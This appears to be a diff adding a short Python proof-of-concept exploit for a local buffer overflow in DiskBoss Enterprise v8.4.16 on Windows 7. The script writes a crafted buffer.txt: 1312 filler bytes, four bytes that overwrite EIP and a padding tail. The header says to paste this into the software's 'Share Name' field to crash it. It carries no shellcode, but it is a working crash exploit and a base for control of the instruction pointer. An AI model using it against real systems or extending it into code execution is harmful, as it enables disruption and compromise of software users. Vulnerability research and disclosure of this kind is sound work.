@@ -1,0 +1,32 @@
+#!/usr/bin/python
+
+#========================================================================================================================
+# Exploit Author: Touhid M.Shaikh
+# Exploit Title: DiskBoss Enterprise v8.4.16 Local Buffer Overflow(PoC)
+# Date: 28-09-2017
+# Website: www.touhidshaikh.com
+# Vulnerable Software: DiskBoss Enterprise v8.4.16
+# Vendor Homepage: http://www.diskboss.com
+# Version: v8.4.16
+# Software Link: http://www.diskboss.com/downloads.html
+# Tested On: Windows 7 x86
+#
+#
+# To reproduce the exploit:
+#   1. Click Server
+#   2. Click Connect
+#   3. In the "Share Name" field, paste the content of buffer.txt , And try
+to connect.........BOOoom....
+#
+#========================================================================================================================
+
+
+junk = "A"*1312
+
+EIP = "B"*4 #EIP overwritten
+
+b = junk+EIP+"D"*500
+
+f = open('buffer.txt','w')
+f.write(b)
+f.close()
